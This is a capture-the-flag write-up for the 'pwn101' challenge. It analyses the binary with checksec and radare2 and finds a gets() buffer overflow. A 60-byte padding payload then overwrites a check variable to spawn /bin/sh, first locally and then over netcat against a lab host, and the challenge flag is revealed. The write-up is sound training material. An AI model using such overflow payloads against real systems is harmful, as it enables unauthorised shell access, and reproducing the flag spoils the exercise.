# pwn101

- [Binary Analysis](#binary-analysis)
- [Local Exploitation](#local-exploitation)
- [Remote Exploitation](#remote-exploitation)

```text

This should give you a start: 'AAAAAAAAAAA'

Challenge is running on port 9001

```

## Binary Analysis

```bash
$ ls
pwn101

$ file pwn101 
pwn101: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=dd42eee3cfdffb116dfdaa750dbe4cc8af68cf43, not stripped

$ checksec --file=pwn101
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

The *radare2* tool is used to further analyze the track.

`radare2`
```text
[0x00000710]> afl
0x000006b0    1      6 sym.imp.puts
0x000006c0    1      6 sym.imp.system
0x000006d0    1      6 sym.imp.gets
0x000006e0    1      6 sym.imp.setvbuf
0x000006f0    1      6 sym.imp.exit
0x00000700    1      6 sym.imp.__cxa_finalize
0x00000710    1     42 entry0
0x00000740    4     40 sym.deregister_tm_clones
0x00000780    4     57 sym.register_tm_clones
0x000007d0    5     51 entry.fini0
0x00000810    1     10 entry.init0
0x00000990    1      2 sym.__libc_csu_fini
0x00000994    1      9 sym._fini
0x0000087b    1     19 sym.banner
0x00000920    4    101 sym.__libc_csu_init
0x0000088e    3    134 main
0x0000081a    1     97 sym.setup
0x00000688    3     23 sym._init
```

Among the symbols, the *main* function is identified.

We proceed with the inspection of the disassembled code of the *main* function.

`main`
```text
[0x00000710]> s main 
[0x0000088e]> pdf
            ; ICOD XREF from entry0 @ 0x72d(r)
┌ 134: int main (int argc, char **argv, char **envp);
│ afv: vars(2:sp[0xc..0x48])
│           0x0000088e      55             push rbp
│           0x0000088f      4889e5         mov rbp, rsp
│           0x00000892      4883ec40       sub rsp, 0x40
│           0x00000896      c745fc3905..   mov dword [var_4h], 0x539
│           0x0000089d      b800000000     mov eax, 0
│           0x000008a2      e873ffffff     call sym.setup
│           0x000008a7      b800000000     mov eax, 0
│           0x000008ac      e8caffffff     call sym.banner
│           0x000008b1      488d3d0802..   lea rdi, str.Hello___I_am_going_to_shopping._nMy_mom_told_me_to_buy_some_ingredients._nUmmm.._But_I_have_low_memory_capacity__So_I_forgot_most_of_them._nAnyway__she_is_preparing_Briyani_for_lunch__Can_you_help_me_to_buy_those_items_:D_n ; 0xac0 ; "Hello!, I am going to shopping.\nMy mom told me to buy some ingredients.\nUmmm.. But I have low memory capacity, So I forgot most of them.\nAnyway, she is preparing Briyani for lunch, Can you help me to buy those items :D\n" ; const char *s
│           0x000008b8      e8f3fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x000008bd      488d3ddc02..   lea rdi, str.Type_the_required_ingredients_to_make_briyani: ; 0xba0 ; "Type the required ingredients to make briyani: " ; const char *s
│           0x000008c4      e8e7fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x000008c9      488d45c0       lea rax, [s]
│           0x000008cd      4889c7         mov rdi, rax                ; char *s
│           0x000008d0      b800000000     mov eax, 0
│           0x000008d5      e8f6fdffff     call sym.imp.gets           ; char *gets(char *s)
│           0x000008da      817dfc3905..   cmp dword [var_4h], 0x539
│       ┌─< 0x000008e1      7516           jne 0x8f9
│       │   0x000008e3      488d3de602..   lea rdi, str.Nah_bruh__you_lied_me_:__nShe_did_Tomato_rice_instead_of_briyani_:_ ; 0xbd0 ; "Nah bruh, you lied me :(\nShe did Tomato rice instead of briyani :/" ; const char *s
│       │   0x000008ea      e8c1fdffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x000008ef      bf39050000     mov edi, 0x539              ; int status
│       │   0x000008f4      e8f7fdffff     call sym.imp.exit           ; void exit(int status)
│       │   ; CODE XREF from main @ 0x8e1(x)
│       └─> 0x000008f9      488d3d1803..   lea rdi, str.Thanks__Heres_a_small_gift_for_you__3 ; 0xc18 ; "Thanks, Here's a small gift for you <3" ; const char *s
│           0x00000900      e8abfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00000905      488d3d3303..   lea rdi, str._bin_sh        ; 0xc3f ; "/bin/sh" ; const char *string
│           0x0000090c      e8affdffff     call sym.imp.system         ; int system(const char *string)
│           0x00000911      90             nop
│           0x00000912      c9             leave
└           0x00000913      c3             ret

[0x0000088e]> afv
var uint32_t var_4h @ rbp-0x4
var char * s @ rbp-0x40
```

The code has a **Buffer Overflow Vulnerability** in the call to the `gets` function, which allocates user input starting from `char * s @ rbp-0x40`.

The *BOF vulnerability* is exploited to overwrite the local variable `uint32_t var_4h @ rbp-0x4` and pass the check to execute the `system("/bin/sh")`.

Payload:

- **padding**, size=(0x40-0x4)=60 bytes to fill the buffer `var char * s @ rbp-0x40`.
- **value**, size=4 bytes to overwrite the value `var uint32_t var_4h @ rbp-0x4`.

## Local Exploitation

Let's create the payload.

```bash
$ python3 -c 'print("A"*60 + "1234")'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234
```

The exploit is run locally.

```bash
$ ./pwn101 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101          

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234
Thanks, Here's a small gift for you <3
$ whoami
ap
$ 

```

Works!

## Remote Exploitation

The exploit is performed remotely by sending the previously constructed payload.

```bash
$ nc 10.10.34.41 9001
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101          

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234
Thanks, Here's a small gift for you <3
$ ls
flag.txt
pwn101
pwn101.c
$ cat flag.txt 
THM{7h4t's_4n_3zy_oveRflowwwww}
^C

```

Flag captured.

---
